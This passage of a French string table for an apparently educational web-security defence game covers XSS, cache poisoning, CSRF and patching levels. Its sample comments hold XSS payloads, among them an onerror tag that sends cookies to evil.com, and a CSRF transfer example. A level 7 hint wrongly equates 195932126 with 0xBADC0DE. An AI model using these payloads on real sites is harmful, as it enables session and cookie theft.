        payloadDetected: 'Payload XSS détecté dans le commentaire: <script>alert("Attaque XSS!")</script>',
        blockedScript: 'Entrée suspecte bloquée: balise <script> détectée et nettoyée',
        criticalExec: 'CRITIQUE: Exécution de script détectée dans le navigateur - Tentative de vol de cookie',
        cspActive: 'Content Security Policy active - Scripts en ligne bloqués',
        normalActivity: 'Activité normale utilisateur - Commentaire posté avec succès',
        onerrorActive: 'XSS via attribut onerror: <img src="x" onerror="..."> - Exploitation active',
        sanitizationActive: 'Nettoyage HTML actif - Attributs dangereux supprimés',
        iframeInjection: 'Injection Iframe détectée: <iframe src="javascript:alert(\'XSS\')"> - Tentative de manipulation DOM',
        cspBlocked: 'Violation CSP bloquée - Sources Iframe restreintes',
        sessionNormal: 'Activité de session utilisateur - Aucun comportement suspect',
        multipleAttempts: 'Tentatives XSS multiples depuis la même IP - Modèle d\'attaque confirmé',
        allSanitized: 'Toutes les entrées utilisateur nettoyées - Protection XSS pleinement active'
      },
      browser: {
        portal: {
          title: 'Portail Employés',
          header: 'Portail Employés Entreprise',
          vulnerable: '⚠️ VULNÉRABLE',
          secure: '✅ SÉCURISÉ',
          warningTitle: '⚠️ AVERTISSEMENT SÉCURITÉ',
          warningText: 'Vulnérabilités XSS détectées! L\'entrée utilisateur n\'est pas nettoyée.',
          warningRisk: 'Risque: Vol de cookie, détournement de session, redirections malveillantes',
          secureTitle: '✅ MODE SÉCURISÉ',
          secureText: 'Nettoyage des entrées actif. Content Security Policy appliquée.',
          secureProt: 'Protection: Échappement HTML, En-têtes CSP, Cookies HttpOnly',
          blockedLabel: '🛡️ BLOQUÉ',
          xssLabel: '🚨 XSS',
          scriptWarning: '⚠️ Ce script s\'exécuterait dans un vrai navigateur!',
          addComment: 'Ajouter Commentaire',
          placeholder: 'Partagez vos pensées...',
          postBtn: 'Publier',
          comments: [
            { id: 1, text: 'Super article! Merci pour le partage.' },
            { id: 2, text: 'Post très instructif, j\'attends la suite.' },
            { id: 3, text: '<script>alert("Attaque XSS!")</script>Ceci est un test' },
            { id: 4, text: 'J\'ai une question sur les détails d\'implémentation.' },
            { id: 5, text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">' },
            { id: 6, text: '<iframe src="javascript:alert(\'XSS\')">' }
          ]
        },
        dashboard: {
          title: 'Tableau de Bord Sécurité Web',
          protections: {
            title: '🛡️ Protections Actives',
            html: 'Nettoyage HTML',
            csp: 'Content Security Policy (CSP)',
            escaping: 'Échappement Sortie',
            httpOnly: 'Cookies HttpOnly',
            enabled: '✅ ACTIVÉ',
            disabled: '❌ DÉSACTIVÉ'
          },
          risk: {
            title: '📊 Analyse Risque XSS',
            level: 'Niveau Risque Global',
            critical: 'CRITIQUE',
            low: 'FAIBLE',
            payloads: 'Payloads XSS Détectés:',
            execution: 'Exécution Script:',
            active: 'ACTIVE ⚠️',
            blocked: 'BLOQUÉE ✅',
            userData: 'Données Utilisateur à Risque:',
            yes: 'OUI (Cookies, Sessions)',
            no: 'NON'
          }
        }
      },
      terminal: {
        initial: [
          '$ Terminal Sécurité Web v4.0',
          '$ Tapez "help" pour les commandes disponibles',
          '$ ⚠️  ATTENTION: Vulnérabilités XSS détectées sur le portail employés!'
        ],
        analyze: {
          header: '=== ANALYSE COMMENTAIRES ===',
          total: 'Total commentaires:',
          safe: 'Commentaires sûrs:',
          suspicious: 'Commentaires suspects:',
          patterns: 'Modèles XSS détectés:',
          action: '⚠️ Action requise: Activer nettoyage des entrées!'
        },
        payload: {
          usage: 'Usage: show-payload <id_commentaire>\nExemple: show-payload 3',
          safe: 'Le commentaire est sûr - aucun XSS détecté',
          header: '=== ANALYSE PAYLOAD XSS ===',
          vector: 'Vecteur d\'Attaque:',
          risk: 'Risque:',
          critical: 'CRITIQUE - Le script peut s\'exécuter!',
          mitigated: 'MITIGÉ - Payload bloqué'
        },
        identify: {
          header: '=== IDENTIFICATION TYPE XSS ===',
          type: 'Type: STORED XSS (XSS Persistant)',
          desc: 'Description: Scripts malveillants stockés en base de données',
          loc: 'Emplacement: Commentaires utilisateurs dans le forum',
          impact: 'Impact: Affecte tous les utilisateurs voyant la page',
          flow: 'Flux d\'Attaque:\n1. L\'attaquant poste un commentaire avec balise <script>\n2. Script stocké en base de données\n3. Script exécuté pour chaque utilisateur',
          success: '✓ Type XSS identifié avec succès!'
        },
        enableSanitization: {
          already: '[!] Nettoyage HTML déjà activé',
          success: '[✓] Nettoyage HTML activé\n[+] Balises dangereuses supprimées: <script>, <iframe>, <object>\n[+] Gestionnaires d\'événements retirés: onclick, onerror, onload\n[+] Risque XSS: SIGNIFICATIVEMENT RÉDUIT'
        },
        enableCsp: {
          already: '[!] CSP est déjà activé',
          success: '[✓] Content Security Policy (CSP) activée\n[+] Scripts en ligne bloqués\n[+] Unsafe-eval désactivé\n[+] Frame-ancestors restreints\n[+] Risque XSS: RÉDUIT'
        },
        enableEscaping: {
          already: '[!] Échappement sortie déjà activé',
          success: '[✓] Échappement sortie activé\n[+] Entités HTML échappées: < devient &lt;, > devient &gt;\n[+] Empêche l\'exécution de script dans le contenu rendu\n[+] Risque XSS: ÉLIMINÉ pour le contenu échappé'
        },
        enableHttpOnly: {
          already: '[!] Cookies HttpOnly déjà activés',
          success: '[✓] Cookies HttpOnly activés\n[+] Cookies inaccessibles au JavaScript\n[+] Empêche le vol de cookie via XSS\n[+] Risque détournement de session: RÉDUIT'
        },
        restart: {
          reqBoth: '[!] Activez au moins le nettoyage et les cookies httponly avant de redémarrer.',
          reqSanitization: '[!] Nettoyage manquant. Utilisez enable-sanitization d\'abord.',
          reqHttpOnly: '[!] Cookies httponly manquants. Utilisez enable-httponly d\'abord.',
          success: '[✓] Application redémarrée\n[✓] Configurations sécurité appliquées\n[✓] Nettoyage HTML: ACTIF\n[✓] Cookies HttpOnly: ACTIFS\n[✓] Attaque XSS mitigée avec succès!'
        },
        scan: {
          header: '=== SCAN VULNÉRABILITÉS ===',
          found: 'VULNÉRABILITÉS TROUVÉES:',
          none: '✓ Aucune vulnérabilité critique détectée',
          recs: 'Recommandations:\n1. Activer nettoyage HTML (CRITIQUE)\n2. Implémenter Content Security Policy (HAUT)\n3. Activer échappement sortie (HAUT)\n4. Définir flag HttpOnly sur les cookies (MOYEN)',
          missingSanitization: '- Pas de nettoyage des entrées',
          missingCsp: '- Content Security Policy manquante',
          missingEscaping: '- Pas d\'échappement de sortie',
          missingHttpOnly: '- Cookies accessibles aux scripts'
        },
        status: {
          header: '=== ÉTAT SÉCURITÉ ===',
          active: 'Attaque XSS Active:',
          execution: 'Exécution Script:',
          app: 'État App:',
          identified: 'Type XSS Identifié:',
          protections: 'Protections Actives:',
          yes: '🔴 OUI',
          no: '🟢 NON',
          activeState: '🔴 ACTIVE',
          blockedState: '🟢 BLOQUÉE',
          restarted: 'REDÉMARRÉE',
          running: 'EN COURS',
          notYet: 'PAS ENCORE'
        },
        help: "Disponible: analyze-comments, show-payload <id>, identify-xss, enable-sanitization, enable-csp, enable-escaping, enable-httponly, scan-vulnerabilities, restart-app",
        notFound: "Commande non trouvée:"
      },
      hints: {
        step0: 'Le portail d\'entreprise montre un comportement anormal. Vérifiez le contenu dans le BROWSER pour comprendre.',
        step1: 'Certains commentaires semblent contenir du code. Dans le TERMINAL utilisez "help" pour voir les commandes.',
        step2: 'Les attaques XSS exploitent les entrées non nettoyées. Analysez les logs SIEM pour voir les modèles.',
        step3: 'Pour protéger les cookies du JavaScript, considérez HttpOnly. Pour bloquer les balises dangereuses, utilisez le nettoyage.',
        step4: 'Après avoir activé les protections nécessaires, n\'oubliez pas de redémarrer l\'application.'
      },
      debrief: {
        winTitle: 'ATTAQUE XSS MITIGÉE!',
        winBody: 'Vous avez protégé avec succès le portail employés contre les attaques Cross-Site Scripting.',
        techniquesTitle: 'TECHNIQUES UTILISÉES:',
        techniques: [
          'Nettoyage d\'Entrée: supprime le code malveillant',
          'Cookies HttpOnly: empêche le vol de session',
          'CSP: limite les sources d\'exécution de script',
          'Échappement Sortie: convertit les caractères spéciaux'
        ]
      }
    },
    // Level 5: Cache Poisoning
    level5: {
      logMessages: {
        cacheMiss: 'Cache MISS - Contenu frais servi depuis l\'origine',
        suspiciousReq: 'Requête suspecte détectée - X-Forwarded-Host: evil.com',
        reqValidated: 'Requête validée - Aucun en-tête suspect détecté',
        cacheHitPoisoned: 'Cache HIT - Réponse mise en cache avec en-tête X-Forwarded-Host malveillant',
        cacheConfigured: 'Cache configuré correctement - Contenu dynamique non mis en cache',
        criticalHit: 'CRITIQUE: Utilisateur légitime a reçu du contenu empoisonné depuis le cache (Cache HIT)',
        safeContent: 'Utilisateur a reçu du contenu frais et sûr depuis le serveur d\'origine',
        normalBrowsing: 'Requête page normale - Utilisateur navigue sur le site',
        cachePollution: 'Pollution de cache détectée - Même clé de cache sert du contenu différent',
        varyConfigured: 'En-tête Vary configuré - La clé de cache correcte inclut tous les en-têtes sensibles',
        consistentContent: 'Le cache sert du contenu cohérent',
        keyCollision: 'Collision clé de cache - Plusieurs requêtes mappées sur la même entrée de cache',
        keyCorrect: 'Clé de cache inclut correctement les en-têtes Host et X-Forwarded-Host',
        multipleAffected: 'Plusieurs utilisateurs touchés - Entrée de cache empoisonnée servie 234 fois',
        normalOps: 'Cache fonctionne normalement - Aucun empoisonnement détecté'
      },
      browser: {
        site: {
          title: 'Site Entreprise',
          alert: '⚠️ ALERTE: Contenu malveillant injecté depuis le cache!',
          malicious: 'Ce contenu a été servi depuis le cache avec des modifications malveillantes',
          headers: 'En-têtes Réponse HTTP:',
          hitWarning: '⚠️ Cache HIT - Servi depuis le cache (234 fois)',
          secure: '✓ SÉCURISÉ',
          purged: '✅ Le cache a été purgé et reconfiguré\n✅ Contenu frais servi depuis le serveur d\'origine',
          missSuccess: '✓ Cache MISS - Contenu frais depuis l\'origine'
        },
        profile: {
          title: 'Profil Utilisateur',
          warning: '⚠️ Attention: Ce contenu personnalisé est servi depuis le cache partagé!',
          hitWarning: '⚠️ Cache HIT - Données utilisateur privées servies depuis le cache public (89 hits)',
          headerError: 'Cache-Control: public, max-age=3600 ❌ (Devrait être private ou no-store!)',
          freshSuccess: '✅ Contenu personnalisé servi frais depuis le serveur d\'origine',
          missSuccess: '✓ Cache MISS - Contenu dynamique non mis en cache',
          headerSuccess: 'Cache-Control: no-store, must-revalidate ✅'
        },
        owasp: {
          title: '🛡️ Cache Poisoning - Guide OWASP',
          whatTitle: '🎯 Qu\'est-ce que le Cache Poisoning?',
          whatText: 'Une attaque qui insère du contenu malveillant dans le cache HTTP partagé. Le contenu empoisonné est servi à tous les utilisateurs accédant à la ressource mise en cache.',
          howTitle: '⚠️ Comment ça marche:',
          howList: [
            'L\'attaquant envoie une requête avec des en-têtes modifiés (ex: X-Forwarded-Host)',
            'Le serveur répond en incluant l\'en-tête dans la réponse',
            'La réponse est mise en cache avec une clé de cache inadéquate',
            'Les utilisateurs légitimes reçoivent la réponse empoisonnée depuis le cache'
          ],
          keyTitle: '🔑 Clé de Cache:',
          keyText: 'La clé de cache définit l\'entrée de cache unique. Si elle n\'inclut pas les en-têtes sensibles (Host, Cookie, etc.), différentes réponses peuvent être servies depuis la même entrée de cache.',
          prevTitle: '✅ Prévention:',
          prevList: [
            '<strong>En-tête Vary:</strong> Inclut les en-têtes sensibles dans la clé de cache',
            '<strong>Cache-Control:</strong> no-store pour le contenu dynamique',
            '<strong>Validation des entrées:</strong> Ne pas faire confiance aux en-têtes client',
            '<strong>Clé de cache correcte:</strong> Inclut Host, Cookie, etc.'
          ]
        }
      },
      terminal: {
        initial: [
          '$ Terminal Gestion Reverse Proxy v1.0',
          '$ Tapez "help" pour les commandes disponibles',
          '$ ⚠️  ATTENTION: Cache poisoning détecté - Contenu malveillant dans le cache!'
        ],
        showCache: {
          empty: '[✓] Le cache est vide',
          header: '=== ENTRÉES CACHE ===',
          path: 'Chemin:',
          status: 'Statut:',
          hits: 'Hits Cache:',
          cachedAt: 'Mis en cache le:',
          xCache: 'X-Cache:'
        },
        purgeCache: {
          alreadyEmpty: '[!] Le cache est déjà vide',
          success: '[✓] Cache purgé avec succès\n[+] Toutes les entrées en cache supprimées\n[+] Les prochaines requêtes récupéreront du contenu frais depuis l\'origine\n[!] N\'oubliez pas de corriger la configuration du cache pour éviter un nouvel empoisonnement!'
        },
        showHeaders: {
          header: '=== EN-TÊTES RÉPONSE HTTP ===',
          current: 'Configuration actuelle:',
          ccPublic: 'public, max-age=3600 ❌',
          ccPrivate: 'no-store, must-revalidate ✅',
          probPublic: 'Le contenu dynamique est mis en cache publiquement',
          probPrivate: 'Empêche correctement la mise en cache du contenu dynamique',
          varyMissing: '<non défini> ❌',
          varySet: 'Host, X-Forwarded-Host, Cookie ✅',
          probVaryMissing: 'La clé de cache n\'inclut pas les en-têtes sensibles',
          probVarySet: 'La clé de cache inclut correctement les en-têtes sensibles',
          xfhEvil: 'evil.com ❌',
          xfhSanitized: '<sanitized> ✅',
          probXfhEvil: 'En-tête non fiable utilisé dans la clé de cache',
          probXfhSanitized: 'En-tête correctement validé'
        },
        identifyHeader: {
          success: '=== ANALYSE EN-TÊTE ===\nVecteur d\'empoisonnement identifié: X-Forwarded-Host\n\nComment ça marche:\n1. L\'attaquant envoie: X-Forwarded-Host: evil.com\n2. Le serveur utilise cet en-tête pour générer la réponse\n3. La réponse est mise en cache avec une clé de cache incorrecte\n4. Tous les utilisateurs reçoivent la réponse empoisonnée\n\nCause racine: La clé de cache n\'inclut pas X-Forwarded-Host\nSolution: Ajoutez l\'en-tête "Vary: X-Forwarded-Host"\n\n✓ Vecteur d\'attaque identifié avec succès!'
        },
        fixCacheKey: {
          already: '[!] La clé de cache est déjà configurée correctement',
          success: '[✓] Configuration clé de cache mise à jour\n[+] La clé de cache inclut maintenant: URL + Host + X-Forwarded-Host + Cookie\n[+] Empêche les collisions de cache provenant de différentes requêtes\n[+] Chaque requête unique obtient sa propre entrée de cache'
        },
        setCacheControl: {
          usage: 'Usage: set-cache-control no-store',
          already: '[!] Cache-Control est déjà défini sur no-store',
          success: '[✓] En-tête Cache-Control mis à jour\n[+] Défini sur: no-store, must-revalidate\n[+] Le contenu dynamique/personnalisé ne sera pas mis en cache\n[+] Seuls les actifs statiques seront mis en cache'
        },
        enableVaryHeader: {
          already: '[!] L\'en-tête Vary est déjà activé',
          success: '[✓] En-tête Vary activé\n[+] Défini sur: Vary: Host, X-Forwarded-Host, Cookie\n[+] La clé de cache inclut maintenant ces en-têtes\n[+] Empêche l\'empoisonnement du cache via manipulation d\'en-tête'
        },
        restartProxy: {
          reqPurge: '[!] Veuillez d\'abord purger le cache avant de redémarrer',
          reqFix: '[!] Veuillez corriger la configuration des en-têtes avant de redémarrer',
          success: '[✓] Reverse proxy redémarré\n[✓] Nouvelle configuration appliquée',
          cacheClean: 'PROPRE',
          cacheDirty: 'NÉCESSITE PURGE',
          headersSecure: 'SÉCURISÉ',
          headersCheck: 'VÉRIFIER CONFIG',
          mitigated: '[✓] Cache poisoning mitigé avec succès!',
          vulnerable: '[!] Système toujours vulnérable'
        },
        status: {
          header: '=== STATUT SÉCURITÉ CACHE ===',
          poisoned: 'Cache Empoisonné:',
          entries: 'Entrées Cache:',
          cleared: 'Cache Purgé:',
          headersFixed: 'En-têtes Corrigés:',
          vary: 'En-tête Vary:',
          keyFixed: 'Clé Cache Corrigée:',
          noCache: 'No-Cache Dynamique:',
          identified: 'En-tête Identifié:',
          restarted: 'Proxy Redémarré:',
          yes: '🔴 OUI',
          no: '🟢 NON'
        },
        help: "Disponible: show-cache, purge-cache, show-headers, identify-header, fix-cache-key, set-cache-control no-store, enable-vary-header, restart-proxy, status",
        notFound: "Commande non trouvée:"
      },
      hints: {
        step0: 'Dans le SIEM analysez les logs et cherchez "Cache HIT" avec contenu anormal. Dans le TERMINAL utilisez "show-cache" pour voir ce qui a été mis en cache.',
        step1: 'Le cache est purgé! Dans le TERMINAL identifiez l\'en-tête responsable avec "identify-header" et analysez comment le proxy met en cache le contenu.',
        step2: 'Dans le TERMINAL activez l\'en-tête "Vary" avec "enable-vary-header" et utilisez "set-cache-control no-store" pour le contenu dynamique. Puis redémarrez le proxy.',
        step3: 'Dans le TERMINAL utilisez "restart-proxy" pour appliquer tous les changements de sécurité. Vérifiez avec "status" que les protections sont actives.',
        step4: {
          a: 'Vous avez presque fini! Dans le TERMINAL utilisez "status" pour vérifier que toutes les protections sont actives.',
          b: 'Rappel: L\'en-tête Vary doit inclure Host et X-Forwarded-Host pour éviter que différentes versions soient mises en cache ensemble.',
          c: 'Dernière étape! Dans le TERMINAL assurez-vous que le proxy est redémarré avec "restart-proxy" et que le cache est propre avec "show-cache".'
        },
        default: 'Dans le TERMINAL utilisez "status" pour vérifier que toutes les protections sont actives!'
      },
      debrief: {
        title: 'ANALYSE DÉFENSE CACHE POISONING',
        cleared: 'Cache purgé:',
        fixed: 'En-têtes corrigés:',
        vary: 'En-tête Vary activé:',
        time: 'Temps réalisation:',
        success: 'RÉSULTAT: Menace Cache Poisoning neutralisée!',
        completed: 'RÉSULTAT: Terminé.',
        fail: 'Temps écoulé! L\'attaque Cache Poisoning a touché trop d\'utilisateurs.\n\nPurgez le cache et configurez les bons en-têtes plus rapidement la prochaine fois.'
      }
    },
    // Level 6: CSRF
    level6: {
      browser: {
        portal: {
          title: 'Portail Financier Entreprise',
          header: 'Portail Financier Entreprise',
          vulnerable: '⚠️ VULNÉRABLE',
          secure: '✅ SÉCURISÉ',
          warningTitle: '⚠️ ALERTE SÉCURITÉ',
          warningText: 'Vulnérabilités CSRF détectées! Les requêtes ne sont pas validées.',
          warningRisk: 'Risque: Virements non autorisés, vol de compte, modification de données',
          secureTitle: '✅ MODE SÉCURISÉ',
          secureText: 'Protection CSRF active. Toutes les requêtes sont validées.',
          secureProt: 'Protection: Jetons CSRF, Cookies SameSite, Validation Origine',
          account: {
            title: 'Résumé du Compte',
            holder: 'Titulaire',
            number: 'Numéro Compte',
            balance: 'Solde Actuel',
            unauthorized: '⚠️ Virement non autorisé détecté!',
            email: 'Email'
          },
          activity: {
            title: 'Activité Récente',
            blockReason: 'Protection CSRF active',
            blockedLabel: '🛡️ BLOQUÉ',
            csrfLabel: '🚨 CSRF',
            forged: '⚠️ Cette requête a été forgée par un site externe!',
            completed: 'TERMINÉ',
            blocked: 'BLOQUÉ',
            amount: 'Montant:',
            newEmail: 'Nouvel email:',
            origin: 'Origine:'
          },
          addComment: 'Ajouter Commentaire',
          placeholder: 'Partagez vos pensées...',
          postBtn: 'Publier'
        },
        dashboard: {
          title: 'Tableau de Bord Protection CSRF',
          protections: {
            title: '🛡️ Protections Actives',
            tokens: 'Jetons CSRF (Synchronizer Pattern)',
            sameSite: 'Cookies SameSite',
            origin: 'Validation Origine/Referer',
            double: 'Double Submit Cookie',
            enabled: '✅ ACTIVÉ',
            disabled: '❌ DÉSACTIVÉ'
          },
          risk: {
            title: '📊 Analyse Risque CSRF',
            level: 'Niveau Risque Global',
            critical: 'CRITIQUE',
            low: 'FAIBLE',
            detected: 'Requêtes CSRF Détectées:',
            unauthorized: 'Actions Non Autorisées:',
            executed: 'EXÉCUTÉES ⚠️',
            blocked: 'BLOQUÉES ✅',
            loss: 'Perte Financière:',
            yes: 'OUI (Cookies, Sessions)',
            no: 'NON'
          },
          vectors: {
            title: '🎯 Vecteurs Attaque CSRF Connus',
            form: {
              title: '1. Soumission Formulaire Malveillant',
              desc: 'L\'attaquant héberge un formulaire caché qui s\'envoie automatiquement au site victime'
            },
            img: {
              title: '2. Exploit Balise Image',
              desc: '<img src="bank.com/transfer?amount=5000">'
            },
            xhr: {
              title: '3. XMLHttpRequest/Fetch',
              desc: 'JavaScript effectuant des requêtes authentifiées vers le site victime'
            }
          }
        },
        malicious: {
          title: 'Site Malveillant',
          header: '☠️ Site de l\'Attaquant',
          desc: 'Cette page malveillante contient des attaques CSRF cachées:',
          how: {
            title: '🎯 Comment fonctionne le CSRF:',
            list: [
              'L\'employé se connecte à company-finance.internal (cookie session défini)',
              'L\'employé visite le site de l\'attaquant (cette page)',
              'Le formulaire caché s\'envoie automatiquement à company-finance.internal',
              'Le navigateur inclut automatiquement le cookie de session',
              'Le portail financier exécute la demande comme si l\'employé l\'avait faite',
              'Fonds de l\'entreprise transférés sans autorisation!'
            ]
          }
        }
      },
      terminal: {
        initial: [
          '$ Terminal Défense CSRF v6.0',
          '$ Tapez "help" pour les commandes disponibles',
          '$ ⚠️  ATTENTION: Attaques CSRF détectées sur le portail financier!'
        ],
        analyze: {
          header: '=== ANALYSE REQUÊTES ===',
          total: 'Total requêtes:',
          legitimate: 'Requêtes légitimes:',
          csrf: 'Requêtes CSRF:',
          patterns: 'Modèles suspects détectés:',
          action: '⚠️ Action requise: Activez la protection CSRF!'
        },
        transaction: {
          header: '=== DÉTAILS TRANSACTION ===',
          id: 'ID:',
          time: 'Heure:',
          user: 'Utilisateur:',
          action: 'Action:',
          amount: 'Montant:',
          destination: 'Destination:',
          origin: 'Origine:',
          status: 'Statut:',
          csrf: 'CSRF:',
          yes: 'OUI ⚠️',
          no: 'NON ✓',
          risk: 'Risque: CRITIQUE - Requête forgée exécutée!',
          safe: 'Statut: Sûr'
        },
        identify: {
          header: '=== IDENTIFICATION ATTAQUE CSRF ===',
          type: 'Type: CLASSIC CSRF (Cross-Site Request Forgery)',
          desc: 'Description: Requêtes modifiant l\'état non autorisées',
          vector: 'Vecteur: Sites externes soumettant des requêtes authentifiées',
          impact: 'Impact: Virements non autorisés, modifications compte, vol données',
          chars: 'Caractéristiques Attaque:',
          success: '✓ Type d\'attaque CSRF identifié avec succès!'
        },
        tokens: {
          already: '[!] Jetons CSRF déjà activés',
          success: '[✓] Jetons CSRF activés (Synchronizer Token Pattern)\n[+] Jeton unique généré par session\n[+] Jeton requis dans toutes les requêtes modifiant l\'état\n[+] Le serveur valide le jeton avant traitement\n[+] Risque CSRF: SIGNIFICATIVEMENT RÉDUIT'
        },
        sameSite: {
          already: '[!] Cookies SameSite déjà activés',
          success: '[✓] Attribut cookie SameSite activé\n[+] Cookies non envoyés avec requêtes cross-site\n[+] Politique: SameSite=Strict\n[+] Empêche inclusion automatique cookie\n[+] Risque CSRF: RÉDUIT'
        },
        origin: {
          already: '[!] Validation Origine déjà activée',
          success: '[✓] Validation Origin/Referer activée\n[+] Vérification en-tête Origin sur les requêtes\n[+] Blocage requêtes domaines externes\n[+] Origine attendue: company-finance.internal\n[+] Risque CSRF: RÉDUIT'
        },
        double: {
          already: '[!] Double Submit Cookie déjà activé',
          success: '[✓] Modèle Double Submit Cookie activé\n[+] Jeton CSRF stocké dans cookie ET paramètre requête\n[+] Le serveur compare les deux valeurs\n[+] L\'attaquant ne peut pas lire le cookie (SOP)\n[+] Risque CSRF: RÉDUIT'
        },
        restart: {
          req: '[!] Aucun changement de sécurité détecté. Appliquez d\'abord les protections.',
          success: '[✓] Portail financier redémarré\n[✓] Nouvelles configurations de sécurité appliquées',
          status: '[✓] Statut protection CSRF:',
          mitigated: '[✓] Attaque CSRF mitigée avec succès!',
          recommend: '[!] Protections supplémentaires recommandées'
        },
        balance: {
          header: '=== STATUT COMPTE ===',
          current: 'Solde Actuel:',
          original: 'Solde Original:',
          loss: 'Perte:',
          secure: 'Statut: Sûr ✓',
          warning: 'ATTENTION: Virement non autorisé détecté!',
          safe: 'Aucune transaction non autorisée'
        },
        scan: {
          header: '=== SCAN VULNÉRABILITÉ CSRF ===',
          found: 'VULNÉRABILITÉS TROUVÉES:',
          none: '✓ Aucune vulnérabilité critique détectée',
          recs: 'Recommandations:\n1. Implémenter Jetons CSRF (CRITIQUE)\n2. Activer Cookies SameSite (ÉLEVÉ)\n3. Valider en-têtes Origin/Referer (ÉLEVÉ)\n4. Considérer modèle Double Submit Cookie (MOYEN)',
          missingTokens: '- Jetons CSRF manquants',
          missingSameSite: '- Cookies SameSite non configurés',
          missingOrigin: '- Aucune validation Origin/Referer',
          missingDouble: '- Double Submit Cookie non implémenté'
        },
        status: {
          header: '=== STATUT SÉCURITÉ ===',
          active: 'Attaque CSRF Active:',
          unauth: 'Actions Non Autorisées:',
          app: 'Statut App:',
          restarted: 'REDÉMARRÉE',
          running: 'EN COURS',
          type: 'Type CSRF Identifié:',
          notYet: 'PAS ENCORE',
          balance: 'Solde Compte:',
          protections: 'Protections Actives:',
          yes: '🔴 OUI',
          no: '🟢 NON'
        },
        help: "Disponible: analyze-requests, show-transaction <id>, identify-csrf, enable-csrf-tokens, enable-samesite, enable-origin-check, restart-app, status"
      },
      logMessages: {
        sessionCreated: 'Utilisateur john.doe connecté - Session créée',
        attackDetected: 'Attaque CSRF: Requête virement non autorisée depuis origine externe',
        blocked: 'Tentative CSRF bloquée: Jeton CSRF manquant ou invalide',
        execution: 'CRITIQUE: Virement argent exécuté sans consentement utilisateur',
        rejected: 'Requête rejetée: Validation Origine échouée',
        sessionHijacked: 'CSRF: Requête changement email depuis origine suspecte - Session utilisateur détournée',
        sameSiteBlocked: 'Politique cookie SameSite active - Requête cross-site bloquée',
        normal: 'Activité utilisateur normale - Requête GET avec session valide',
        passwordChange: 'Changement mot de passe exécuté via CSRF - Identifiants compromis',
        tokenPassed: 'Validation jeton CSRF: RÉUSSIE - Requête authentifiée',
        multipleAttempts: 'Tentatives CSRF multiples détectées - Modèle attaque: Requêtes falsifiées',
        validated: 'Toutes les requêtes validées - Protection CSRF active',
        vectorConfirmed: 'Vecteur attaque CSRF confirmé - Formulaires malveillants sur sites externes',
        doubleEnforced: 'Modèle double-submit cookie appliqué - Toutes requêtes sûres'
      },
      hints: {
        step0: 'Dans le SIEM analysez les transactions. Voyez-vous des requêtes d\'origines externes (evil-site.com)? Dans le TERMINAL utilisez "analyze-requests" pour analyser les détails.',
        step1: 'Vous avez identifié CSRF! Dans le TERMINAL utilisez "enable-csrf-tokens" pour ajouter des jetons de vérification.',
        step2: 'Dans le TERMINAL ajoutez "enable-samesite" pour une protection extra, puis utilisez "restart-app".',
        step3: {
          a: '✅ Bien! Les protections CSRF sont actives. Dans le TERMINAL utilisez "status" pour vérifier.',
          b: 'Rappel: Les jetons CSRF et cookies SameSite protègent contre les requêtes non autorisées.',
          c: 'Presque fini! Dans le TERMINAL assurez-vous que "enable-csrf-tokens" et "enable-samesite" sont actifs.'
        },
        default: '✅ Dans le TERMINAL vérifiez le statut avec "status" et le solde dans le NAVIGATEUR!'
      },
      debrief: {
        title: 'ANALYSE DÉFENSE CSRF',
        protections: 'Protections activées:',
        unauth: 'Actions non autorisées:',
        active: 'ACTIVES',
        blocked: 'BLOQUÉES',
        balance: 'Solde compte:',
        time: 'Temps réalisation:',
        success: 'RÉSULTAT: Attaque CSRF mitigée avec succès!',
        completed: 'RÉSULTAT: Terminé.',
        fail: 'Les fonds ont été volés via des attaques CSRF réussies.\n\nActivez les jetons CSRF et la protection SameSite avant de redémarrer.'
      }
    },
    // Level 7
    level7: {
      title: "Level 7: Reverse Engineering & Patching",
      subtitle: "Analyze binary logic and bypass security controls",
      siem: {
        startup: "System startup",
        login: "User login",
        bypass: "Auth Bypass Detected: Admin access granted to anonymous user."
      },
      terminal: {
        waiting: "Waiting for tasks...",
        alert: "ALERT: Vulnerability detected in 'auth.exe'.",
        action: "ACTION REQUIRED: Fix the security check logic.",
        authPatched: "auth.exe patched. Ready to compile & test.",
        updaterPatched: "updater.exe patched. Ready to compile & test.",
        compilingAuth: "Compiling auth.exe... OK. (Binary patched)",
        compilingUpdater: "Compiling updater.exe... OK. (Binary patched)",
        nothing: "Nothing to compile.",
        execAuth: "Executing auth.exe...",
        enterCode: "Enter Access Code: 195932126",
        accessGranted: "[SUCCESS] Access Granted! System Unlocked.",
        vulnFixed: "STATUS: Vulnerability fixed. Code is now required.",
        nextInstruction: "INSTRUCTION: Now analyze 'updater.exe'. It has a similar flaw.",
        failAuth: "FAIL: The system still accepts ANY code! You must restrict it.",
        execUpdater: "Executing updater.exe...",
        sigVerified: "[SUCCESS] Signature Verified (Bypassed). Running update...",
        missionAccomplished: "MISSION ACCOMPLISHED.",
        sigFailed: "[ERROR] Signature Verification Failed!",
        failUpdater: "FAIL: The update service blocked the execution.",
        help: "Available: ls, build, ./auth.exe, ./updater.exe"
      },
      hints: {
        phase0: "Monitor the SIEM. Wait for a critical security alert.",
        phase1: [
          "We detected that 'auth.exe' grants access to anyone. There seems to be a severe programming error (Debug Mode left active).",
          "Analyze the decompiled C code via 'RE Tool'. Look for the 'check_credentials' function. Do you notice anything strange in the IF statement?",
          "The 'if(1)' statement (or if(true)) makes the condition always true, bypassing every check. We must restore security.",
          "Modify the code: replace 'if(1)' with a security code check. The correct code should be 195932126 (0xBADC0DE). Ex: 'if (input_code == 195932126)'"
        ],
        phase2: "Now that you've restored security, use 'build' in the terminal to compile and run './auth.exe' to verify access is protected.",
        phase3: "Perfect, now do it again. 'updater.exe' has the opposite problem. It blocks valid updates too. Analyze and fix the logic.",
        phase4: "Patched updater.exe? Good. Now compile and run it in the terminal as you learned."
      },
      debrief: {
        win: "VULNERABILITY IDENTIFIED: Logic Bypass & Client-Side Trust.\n\nYou demonstrated how poorly implemented client-side security controls can be bypassed.\n\nLESSON LEARNED: Never trust client-side input. Cleaning comments and debug code is crucial to avoid giving clues to attackers.",
        loss: "MISSION FAILED. System compromised or too many errors committed."
      }
    },
    // Level 8
    level8: {
      hints: {
        start: "Inbox: Suspicious Activity Report. Check your email for Emergency Protocols.",
        emergency: "Great! Process Terminated. Now investigate logs (SIEM) to find the source IP.",
        compromised: "SYSTEM COMPROMISED! Find manual override! (Hint: Emergency Manual says Ctrl+Alt+K to disable network interface and start investigation.)"
      },
      emails: {
        ciso: {
          subject: "URGENT: Incident Response Protocols Update",
